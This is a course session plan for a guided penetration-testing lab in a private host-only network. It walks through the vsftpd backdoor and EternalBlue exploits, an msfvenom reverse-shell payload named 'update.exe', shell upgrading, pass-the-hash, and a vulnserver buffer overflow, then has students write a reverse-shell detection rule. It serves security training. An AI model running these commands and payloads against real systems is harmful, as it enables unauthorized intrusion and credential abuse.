---
session: 5
title: Guided Lab — Session 5
---

# Session 5 — Guided Lab (10 labs + 8 mini-labs)

## Objective
Turn the S4 access plan into a shell on every reachable host, keep the shells usable, walk one buffer overflow end to end, then detect a reverse shell and record every foothold.

## Targets & authorization (read before anything)
Your own host-only lab only: Metasploitable2 (192.168.56.102), WIN7-TGT01 (.107), WIN10-TGT01 (.108), `ceh.lab` DC (.20), Kali (.101). Firing an exploit or catching a shell on any host you do not own is a crime.

## Environment / setup
`msfdb init` → `db_status` Connected. `pre-s5` snapshots on every target. S4 access plan + one working credential in hand. vulnserver+Immunity+mona on WIN10 (Lab 8 primary); Kali gdb fallback binary.

## Lab pre-flight (5 min)
`ping`/`nmap -p445` the targets · `db_status` · confirm one S4 credential with `nxc smb`.

## Lab 1 — manual vsftpd 2.3.4 (15 min) → foothold: root on MSF2
`nc 192.168.56.102 21` → `USER hacker:)` → second `nc` to 6200 → `id` = uid=0. Read the mechanism first (smiley = trigger).

## Lab 2 — same via Metasploit (12 min) → compare
`use exploit/unix/ftp/vsftpd_234_backdoor` → `set RHOSTS` → `exploit`. Discuss what it automated (4–6) vs step 3.

## Lab 3 — EternalBlue → SYSTEM (15 min) → foothold: SYSTEM on WIN7
`use exploit/windows/smb/ms17_010_eternalblue` → `check` → `exploit` → `getuid` = NT AUTHORITY\SYSTEM. Save Sysmon/Security logs for Lab 9 (fallback: `saved/lab3_eternalblue_sysmon.evtx`).

## Lab 4 — bind vs reverse (12 min) → the failure teaches
Bind payload on WIN10 (firewall on) → handler cannot connect (blocked). Reverse payload on 443 → session opens. Same box, opposite direction.

## Lab 5 — msfvenom + multi/handler (14 min) → generates evidence
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=.101 LPORT=443 -f exe -o update.exe` → handler up FIRST → run → `getuid`. Deliberate failure: handler down = no stage. Save Sysmon 1/3 for Lab 9 (`saved/lab5_revshell_sysmon.evtx`).

## Lab 6 — upgrade a shell (10 min)
Catch raw `nc` shell → prove it is dumb (sudo fails) → `pty.spawn` + `stty raw -echo; fg` + `export TERM=xterm` → optional `sessions -u` to meterpreter.

## Lab 7 — credential access (10 min) → foothold: cred-based, the S6 bridge
`impacket-psexec ceh.lab/m.said:'Autumn2025!'@192.168.56.20` → whoami = SYSTEM. `evil-winrm -i .20 -u administrator -H <hash>` (pass-the-hash). No exploit.

## Lab 8 — guided buffer overflow (20 min) → foothold: low-priv on WIN10
A) fuzz vulnserver TRUN to crash (EIP=41414141). B) `msf-pattern_create/offset` → offset. C) confirm EIP=42424242. D) `!mona bytearray` → bad chars (\x00\x0a\x0d). E) `!mona jmp -r esp` → JMP ESP address. F) `msfvenom ... -b "\x00\x0a\x0d" -f py` → final buffer (A*offset + JMP_ESP + NOPs + shellcode) → `nc` catch. **Saved state at every step**; Linux gdb fallback available.

## Lab 9 — write the detection rule (16 min) → the signature exercise (PROTECT)
Read Lab 3/5 evidence as a defender. Worked Sigma (server/service parent → shell child + outbound). Write ONE working rule in Sigma/SPL/KQL and note one false-positive source it survives.

## Lab 10 — foothold record (12 min) → the deliverable
One row per host: got-in-via, payload/shell, **landed as**, proof. Record in the cumulative Team Report; export HTML/PDF.

## Success check (show your instructor)
- A manual root shell (Lab 1) AND the same via MSF (Lab 2).
- A SYSTEM meterpreter on WIN7 (Lab 3) with `getuid` proof.
- A reverse shell caught with your own msfvenom payload (Lab 5).
- A shell from a credential alone (Lab 7).
- A completed BOF chain to a shell (Lab 8), even with saved-state hints.
- One working reverse-shell detection rule (Lab 9) and a completed foothold record (Lab 10).

## Common mistakes
- Handler not started before a **staged** payload runs → no session (start it first).
- Wrong `-f` format for the target → the payload will not run.
- Bind shell "not working" — that is the firewall; use reverse.
- Forgetting the **bad-character** removal in the BOF → shellcode mangled, no shell.
- Recording command dumps instead of conclusions in the foothold record.
